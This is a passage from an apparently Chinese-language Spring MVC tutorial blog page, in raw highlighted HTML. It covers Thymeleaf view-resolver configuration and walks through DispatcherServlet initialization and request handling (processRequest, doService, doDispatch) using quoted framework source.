class="line"><span class="comment">resolvers.add(exceptionResolver);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">    <span class="comment">//配置生成模板解析器</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ITemplateResolver <span class="title function_">templateResolver</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">webApplicationContext</span> <span class="operator">=</span>ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line">            <span class="comment">// ServletContextTemplateResolver需要一个ServletContext作为构造参数，可通过WebApplicationContext 的方法获得</span></span><br><span class="line">            <span class="type">ServletContextTemplateResolver</span> <span class="variable">templateResolver</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ServletContextTemplateResolver</span>(webApplicationContext.getServletContext());</span><br><span class="line">        templateResolver.setPrefix(<span class="string">&quot;/WEB-INF/templates/&quot;</span>);</span><br><span class="line">        templateResolver.setSuffix(<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">        templateResolver.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        templateResolver.setTemplateMode(TemplateMode.HTML);</span><br><span class="line">        <span class="keyword">return</span> templateResolver;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//生成模板引擎并为模板引擎注入模板解析器</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SpringTemplateEngine <span class="title function_">templateEngine</span><span class="params">(ITemplateResolver templateResolver)</span> &#123;</span><br><span class="line">        <span class="type">SpringTemplateEngine</span> <span class="variable">templateEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpringTemplateEngine</span>();</span><br><span class="line">        templateEngine.setTemplateResolver(templateResolver);</span><br><span class="line">        <span class="keyword">return</span> templateEngine;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//生成视图解析器并未解析器注入模板引擎</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ViewResolver <span class="title function_">viewResolver</span><span class="params">(SpringTemplateEngine templateEngine)</span> &#123;</span><br><span class="line">        <span class="type">ThymeleafViewResolver</span> <span class="variable">viewResolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThymeleafViewResolver</span>();</span><br><span class="line">        viewResolver.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        viewResolver.setTemplateEngine(templateEngine);</span><br><span class="line">        <span class="keyword">return</span> viewResolver;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-4、测试功能"><a href="#13-4、测试功能" class="headerlink" title="13.4、测试功能"></a>13.4、测试功能</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="14、SpringMVC执行流程"><a href="#14、SpringMVC执行流程" class="headerlink" title="14、SpringMVC执行流程"></a>14、SpringMVC执行流程</h1><h2 id="14-1、SpringMVC常用组件"><a href="#14-1、SpringMVC常用组件" class="headerlink" title="14.1、SpringMVC常用组件"></a>14.1、SpringMVC常用组件</h2><ul><li>DispatcherServlet：<strong>前端控制器</strong>，不需要工程师开发，由框架提供</li></ul><p>作用：统一处理请求和响应，整个流程控制的中心，由它调用其它组件处理用户的请求</p><ul><li>HandlerMapping：<strong>处理器映射器</strong>，不需要工程师开发，由框架提供</li></ul><p>作用：根据请求的url、method等信息查找Handler，即控制器方法</p><ul><li>Handler：<strong>处理器</strong>，需要工程师开发</li></ul><p>作用：在DispatcherServlet的控制下Handler对具体的用户请求进行处理</p><ul><li>HandlerAdapter：<strong>处理器适配器</strong>，不需要工程师开发，由框架提供</li></ul><p>作用：通过HandlerAdapter对处理器（控制器方法）进行执行</p><ul><li>ViewResolver：<strong>视图解析器</strong>，不需要工程师开发，由框架提供</li></ul><p>作用：进行视图解析，得到相应的视图，例如：ThymeleafView、InternalResourceView、</p><p>RedirectView</p><ul><li>View：<strong>视图</strong></li></ul><p>作用：将模型数据通过页面展示给用户</p><h2 id="14-2、DispatcherServlet初始化过程"><a href="#14-2、DispatcherServlet初始化过程" class="headerlink" title="14.2、DispatcherServlet初始化过程"></a>14.2、DispatcherServlet初始化过程</h2><p>DispatcherServlet 本质上是一个 Servlet，所以天然的遵循 Servlet 的生命周期。所以宏观上是 Servlet生命周期来进行调度。</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/33.png"></p><h3 id="①初始化WebApplicationContext"><a href="#①初始化WebApplicationContext" class="headerlink" title="①初始化WebApplicationContext"></a>①初始化WebApplicationContext</h3><p>所在类：org.springframework.web.servlet.FrameworkServlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebApplicationContext <span class="title function_">initWebApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">WebApplicationContext</span> <span class="variable">rootContext</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(getServletContext());</span><br><span class="line">    <span class="type">WebApplicationContext</span> <span class="variable">wac</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.webApplicationContext != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// A context instance was injected at construction time -&gt; use it</span></span><br><span class="line">        wac = <span class="built_in">this</span>.webApplicationContext;</span><br><span class="line">        <span class="keyword">if</span> (wac <span class="keyword">instanceof</span> ConfigurableWebApplicationContext) &#123;</span><br><span class="line">            <span class="type">ConfigurableWebApplicationContext</span> <span class="variable">cwac</span> <span class="operator">=</span>(ConfigurableWebApplicationContext) wac;</span><br><span class="line">            <span class="keyword">if</span> (!cwac.isActive()) &#123;</span><br><span class="line">                <span class="comment">// The context has not yet been refreshed -&gt; provide services such as</span></span><br><span class="line">                    <span class="comment">// setting the parent context, setting the application context id, etc</span></span><br><span class="line">                    <span class="keyword">if</span> (cwac.getParent() == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// The context instance was injected without an explicit parent -&gt; set</span></span><br><span class="line">                            <span class="comment">// the root application context (if any; may be null) as the parent</span></span><br><span class="line">                            cwac.setParent(rootContext);</span><br><span class="line">                    &#125;</span><br><span class="line">                configureAndRefreshWebApplicationContext(cwac);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wac == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// No context instance was injected at construction time -&gt; see if one</span></span><br><span class="line">        <span class="comment">// has been registered in the servlet context. If one exists, it is assumed</span></span><br><span class="line">            <span class="comment">// that the parent context (if any) has already been set and that the</span></span><br><span class="line">            <span class="comment">// user has performed any initialization such as setting the context id</span></span><br><span class="line">            wac = findWebApplicationContext();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wac == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// No context instance is defined for this servlet -&gt; create a local one</span></span><br><span class="line">        <span class="comment">// 创建WebApplicationContext</span></span><br><span class="line">        wac = createWebApplicationContext(rootContext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.refreshEventReceived) &#123;</span><br><span class="line">        <span class="comment">// Either the context is not a ConfigurableApplicationContext with refresh</span></span><br><span class="line">            <span class="comment">// support or the context injected at construction time had already been</span></span><br><span class="line">            <span class="comment">// refreshed -&gt; trigger initial onRefresh manually here.</span></span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>.onRefreshMonitor) &#123;</span><br><span class="line">            <span class="comment">// 刷新WebApplicationContext</span></span><br><span class="line">            onRefresh(wac);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.publishContext) &#123;</span><br><span class="line">        <span class="comment">// Publish the context as a servlet context attribute.</span></span><br><span class="line">        <span class="comment">// 将IOC容器在应用域共享</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">attrName</span> <span class="operator">=</span> getServletContextAttributeName();</span><br><span class="line">        getServletContext().setAttribute(attrName, wac);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> wac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="②创建WebApplicationContext"><a href="#②创建WebApplicationContext" class="headerlink" title="②创建WebApplicationContext"></a>②创建WebApplicationContext</h3><p>所在类：org.springframework.web.servlet.FrameworkServlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebApplicationContext <span class="title function_">createWebApplicationContext</span><span class="params">(<span class="meta">@Nullable</span> ApplicationContext parent)</span> &#123;</span><br><span class="line">    Class&lt;?&gt; contextClass = getContextClass();</span><br><span class="line">    <span class="keyword">if</span> (!ConfigurableWebApplicationContext.class.isAssignableFrom(contextClass))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ApplicationContextException</span>(<span class="string">&quot;Fatal initialization error in servlet with name &#x27;&quot;</span> +getServletName() +</span><br><span class="line">                                              <span class="string">&quot;&#x27;: custom WebApplicationContext class [&quot;</span> + contextClass.getName() +</span><br><span class="line">                                              <span class="string">&quot;] is not of type ConfigurableWebApplicationContext&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通过反射创建 IOC 容器对象</span></span><br><span class="line">    <span class="type">ConfigurableWebApplicationContext</span> <span class="variable">wac</span> <span class="operator">=</span> (ConfigurableWebApplicationContext)BeanUtils.instantiateClass(contextClass);</span><br><span class="line">    wac.setEnvironment(getEnvironment());</span><br><span class="line">    <span class="comment">// 设置父容器</span></span><br><span class="line">    wac.setParent(parent);</span><br><span class="line">    <span class="type">String</span> <span class="variable">configLocation</span> <span class="operator">=</span> getContextConfigLocation();</span><br><span class="line">    <span class="keyword">if</span> (configLocation != <span class="literal">null</span>) &#123;</span><br><span class="line">        wac.setConfigLocation(configLocation);</span><br><span class="line">    &#125;</span><br><span class="line">    configureAndRefreshWebApplicationContext(wac);</span><br><span class="line">    <span class="keyword">return</span> wac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="③DispatcherServlet初始化策略"><a href="#③DispatcherServlet初始化策略" class="headerlink" title="③DispatcherServlet初始化策略"></a>③DispatcherServlet初始化策略</h3><p>FrameworkServlet创建WebApplicationContext后，刷新容器，调用onRefresh(wac)，此方法在</p><p>DispatcherServlet中进行了重写，调用了initStrategies(context)方法，初始化策略，即初始化</p><p>DispatcherServlet的各个组件</p><p>所在类：org.springframework.web.servlet.DispatcherServlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initStrategies</span><span class="params">(ApplicationContext context)</span> &#123;</span><br><span class="line">    initMultipartResolver(context);</span><br><span class="line">    initLocaleResolver(context);</span><br><span class="line">    initThemeResolver(context);</span><br><span class="line">    initHandlerMappings(context);</span><br><span class="line">    initHandlerAdapters(context);</span><br><span class="line">    initHandlerExceptionResolvers(context);</span><br><span class="line">    initRequestToViewNameTranslator(context);</span><br><span class="line">    initViewResolvers(context);</span><br><span class="line">    initFlashMapManager(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="14-3、DispatcherServlet调用组件处理请求"><a href="#14-3、DispatcherServlet调用组件处理请求" class="headerlink" title="14.3、DispatcherServlet调用组件处理请求"></a>14.3、DispatcherServlet调用组件处理请求</h2><h3 id="①processRequest"><a href="#①processRequest" class="headerlink" title="①processRequest()"></a>①processRequest()</h3><p>FrameworkServlet重写HttpServlet中的service()和doXxx()，这些方法中调用了</p><p>processRequest(request, response)</p><p>所在类：org.springframework.web.servlet.FrameworkServlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">processRequest</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span><span class="keyword">throws</span> ServletException, IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">failureCause</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">LocaleContext</span> <span class="variable">previousLocaleContext</span> <span class="operator">=</span> LocaleContextHolder.getLocaleContext();</span><br><span class="line">    <span class="type">LocaleContext</span> <span class="variable">localeContext</span> <span class="operator">=</span> buildLocaleContext(request);</span><br><span class="line">    <span class="type">RequestAttributes</span> <span class="variable">previousAttributes</span> <span class="operator">=</span> RequestContextHolder.getRequestAttributes();</span><br><span class="line">    <span class="type">ServletRequestAttributes</span> <span class="variable">requestAttributes</span> <span class="operator">=</span> buildRequestAttributes(request,response, previousAttributes);</span><br><span class="line">    <span class="type">WebAsyncManager</span> <span class="variable">asyncManager</span> <span class="operator">=</span> WebAsyncUtils.getAsyncManager(request);</span><br><span class="line">    asyncManager.registerCallableInterceptor(FrameworkServlet.class.getName(),<span class="keyword">new</span> <span class="title class_">RequestBindingInterceptor</span>());</span><br><span class="line">    initContextHolders(request, localeContext, requestAttributes);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 执行服务，doService()是一个抽象方法，在DispatcherServlet中进行了重写</span></span><br><span class="line">        doService(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ServletException | IOException ex) &#123;</span><br><span class="line">        failureCause = ex;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">        failureCause = ex;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Request processing failed&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        resetContextHolders(request, previousLocaleContext, previousAttributes);</span><br><span class="line">        <span class="keyword">if</span> (requestAttributes != <span class="literal">null</span>) &#123;</span><br><span class="line">            requestAttributes.requestCompleted();</span><br><span class="line">        &#125;</span><br><span class="line">        logResult(request, response, failureCause, asyncManager);</span><br><span class="line">        publishRequestHandledEvent(request, response, startTime, failureCause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="②doService"><a href="#②doService" class="headerlink" title="②doService()"></a>②doService()</h3><p>所在类：org.springframework.web.servlet.DispatcherServlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">logRequest(request);</span><br><span class="line">    <span class="comment">// Keep a snapshot of the request attributes in case of an include,</span></span><br><span class="line">    <span class="comment">// to be able to restore the original attributes after the include.</span></span><br><span class="line">    Map&lt;String, Object&gt; attributesSnapshot = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (WebUtils.isIncludeRequest(request)) &#123;</span><br><span class="line">        attributesSnapshot = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Enumeration&lt;?&gt; attrNames = request.getAttributeNames();</span><br><span class="line">        <span class="keyword">while</span> (attrNames.hasMoreElements()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">attrName</span> <span class="operator">=</span> (String) attrNames.nextElement();</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.cleanupAfterInclude || attrName.startsWith(DEFAULT_STRATEGIES_PREFIX)) &#123;</span><br><span class="line">                attributesSnapshot.put(attrName,request.getAttribute(attrName));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Make framework objects available to handlers and view objects.</span></span><br><span class="line">    request.setAttribute(WEB_APPLICATION_CONTEXT_ATTRIBUTE,getWebApplicationContext());</span><br><span class="line">    request.setAttribute(LOCALE_RESOLVER_ATTRIBUTE, <span class="built_in">this</span>.localeResolver);</span><br><span class="line">    request.setAttribute(THEME_RESOLVER_ATTRIBUTE, <span class="built_in">this</span>.themeResolver);</span><br><span class="line">    request.setAttribute(THEME_SOURCE_ATTRIBUTE, getThemeSource());</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.flashMapManager != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">FlashMap</span> <span class="variable">inputFlashMap</span> <span class="operator">=</span> <span class="built_in">this</span>.flashMapManager.retrieveAndUpdate(request,response);</span><br><span class="line">        <span class="keyword">if</span> (inputFlashMap != <span class="literal">null</span>) &#123;</span><br><span class="line">            request.setAttribute(INPUT_FLASH_MAP_ATTRIBUTE,Collections.unmodifiableMap(inputFlashMap));</span><br><span class="line">        &#125;</span><br><span class="line">        request.setAttribute(OUTPUT_FLASH_MAP_ATTRIBUTE, <span class="keyword">new</span> <span class="title class_">FlashMap</span>());</span><br><span class="line">        request.setAttribute(FLASH_MAP_MANAGER_ATTRIBUTE, <span class="built_in">this</span>.flashMapManager);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">RequestPath</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.parseRequestPath &amp;&amp; !ServletRequestPathUtils.hasParsedRequestPath(request)) &#123;</span><br><span class="line">        requestPath = ServletRequestPathUtils.parseAndCache(request);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 处理请求和响应</span></span><br><span class="line">        doDispatch(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span></span><br><span class="line">            (!WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="comment">// Restore the original attribute snapshot, in case of an include.</span></span><br><span class="line">            <span class="keyword">if</span> (attributesSnapshot != <span class="literal">null</span>) &#123;</span><br><span class="line">                restoreAttributesAfterInclude(request, attributesSnapshot);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (requestPath != <span class="literal">null</span>) &#123;</span><br><span class="line">            ServletRequestPathUtils.clearParsedRequestPath(request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="③doDispatch"><a href="#③doDispatch" class="headerlink" title="③doDispatch()"></a>③doDispatch()</h3><p>所在类：org.springframework.web.servlet.DispatcherServlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">processedRequest</span> <span class="operator">=</span> request;</span><br><span class="line">    <span class="type">HandlerExecutionChain</span> <span class="variable">mappedHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">multipartRequestParsed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">WebAsyncManager</span> <span class="variable">asyncManager</span> <span class="operator">=</span> WebAsyncUtils.getAsyncManager(request);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Exception</span> <span class="variable">dispatchException</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processedRequest = checkMultipart(request);</span><br><span class="line">            multipartRequestParsed = (processedRequest != request);</span><br><span class="line">            <span class="comment">// Determine handler for the current request.</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                mappedHandler：调用链</span></span><br><span class="line"><span class="comment">                包含handler、interceptorList、interceptorIndex</span></span><br><span class="line"><span class="comment">                handler：浏览器发送的请求所匹配的控制器方法</span></span><br><span class="line"><span class="comment">                interceptorList：处理控制器方法的所有拦截器集合</span></span><br><span class="line"><span class="comment">                interceptorIndex：拦截器索引，控制拦截器afterCompletion()的执行</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            mappedHandler = getHandler(processedRequest);</span><br><span class="line">            <span class="keyword">if</span> (mappedHandler == <span class="literal">null</span>) &#123;</span><br><span class="line">                noHandlerFound(processedRequest, response);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Determine handler adapter for the current request.</span></span><br><span class="line">            <span class="comment">// 通过控制器方法创建相应的处理器适配器，调用所对应的控制器方法</span></span><br><span class="line">            <span class="type">HandlerAdapter</span> <span class="variable">ha</span> <span class="operator">=</span> getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line">            <span class="comment">// Process last-modified header, if supported by the handler.</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isGet</span> <span class="operator">=</span> <span class="string">&quot;GET&quot;</span>.equals(method);</span><br><span class="line">            <span class="keyword">if</span> (isGet || <span class="string">&quot;HEAD&quot;</span>.equals(method)) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">lastModified</span> <span class="operator">=</span> ha.getLastModified(request,mappedHandler.getHandler());</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">ServletWebRequest</span>(request,response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 调用拦截器的preHandle()</span></span><br><span class="line">            <span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Actually invoke the handler.</span></span><br><span class="line">            <span class="comment">// 由处理器适配器调用具体的控制器方法，最终获得ModelAndView对象</span></span><br><span class="line">            mv = ha.handle(processedRequest, response,mappedHandler.getHandler());</span><br><span class="line">            <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            applyDefaultViewName(processedRequest, mv);</span><br><span class="line">            <span class="comment">// 调用拦截器的postHandle()</span></span><br><span class="line">            mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            dispatchException = ex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable err) &#123;</span><br><span class="line">            <span class="comment">// As of 4.3, we&#x27;re processing Errors thrown from handler methods as well,</span></span><br><span class="line">            <span class="comment">// making them available for @ExceptionHandler methods and otherscenarios.</span></span><br><span class="line">            dispatchException = <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Handler dispatchfailed&quot;</span>, err);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// 后续处理：处理模型数据和渲染视图 </span></span><br><span 